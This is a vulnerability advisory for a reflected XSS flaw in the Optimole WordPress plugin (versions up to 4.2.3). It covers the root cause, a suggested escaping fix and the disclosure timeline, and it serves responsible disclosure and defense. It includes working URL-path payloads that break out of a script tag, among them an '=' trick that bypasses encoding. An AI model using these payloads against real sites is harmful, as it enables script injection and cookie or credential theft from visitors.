# Optimole WordPress Plugin - Reflected XSS (CVE-2026-5226)

## Description
The Optimole – Optimize Images in Real Time plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via URL paths in versions up to, and including, 4.2.3 This is due to insufficient output escaping on user-supplied URL paths in the get_current_url() function, which are inserted into JavaScript code via str_replace() without proper JavaScript context escaping in the replace_content() function. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.

## Plugin Info
| Field | Value |
|---|---|
| Plugin | [optimole-wp](https://wordpress.org/plugins/optimole-wp/) |
| Vendor | [optimole.com](https://optimole.com/) |
| Vulnerable Version | ≤ 4.2.3 |
| Type | Reflected XSS |
| CVSS Score | 6.1 (Medium) |
| Authentication | Not required |

## Vulnerability Classification
| Field | Value |
|---|---|
| CWE-79 | Improper Neutralization of Input During Web Page Generation (XSS) |
| CWE-116 | Improper Encoding or Escaping of Output |
| CWE-20 | Improper Input Validation |

## Root Cause
`pageProfileUrl` is written to the page as:
```js
var optimoleDataOptimizer = {
  "pageProfileUrl": "https://target.com/[UNSANITIZED_PATH]"
};
```
When the path contains `=`, encoding is bypassed and `</script>` closes the script tag, 
allowing arbitrary HTML/JS injection.

## Payloads
```
/</script><script>alert(1)</script>=
/RandomDirectory/</script><script>alert(1)</script>x=y
```

Normal (blocked — path gets URL-encoded):
```
/RandomDirectory/</script><script>alert(1)</script>
```

Bypass (works — `=` causes parser to skip encoding):
```
/RandomDirectory/</script><script>alert(1)</script>x=y
```

## PoC

**Vulnerable output in page source:**
<img width="1214" height="120" alt="Image" src="https://i.imgur.com/55yqTJo.png" />
<br>
<br>
<img src="https://i.imgur.com/0AQUsT8.png" />

**XSS triggered:**
<img width="963" height="429" alt="image" src="https://i.imgur.com/4pKc64l.png" />
<br>
<img width="899" height="198" alt="image" src="https://i.imgur.com/rmvBETO.png" />
<br>
<img width="1111" height="630" alt="image" src="https://i.imgur.com/NEIs7Jh.png" />

## Impact
- Session/cookie theft
- Credential harvesting via fake login overlays
- Arbitrary JS execution in victim's browser
- No authentication required — any visitor can be targeted

## Researchers
| Name |
|---|
| Ali Cem Havare |
| Cesi De Taranto |
| Sencer Kılıç |

## Suggested Fix
```php
'pageProfileUrl' => esc_js( esc_url( $current_url ) )
```

## Disclosure Timeline
| Date | Event |
|---|---|
| 2026-03-16 | Vulnerability discovered |
| 2026-03-19 | Vendor notified |
| 2026-04-04 | Patch released / CVE assigned |
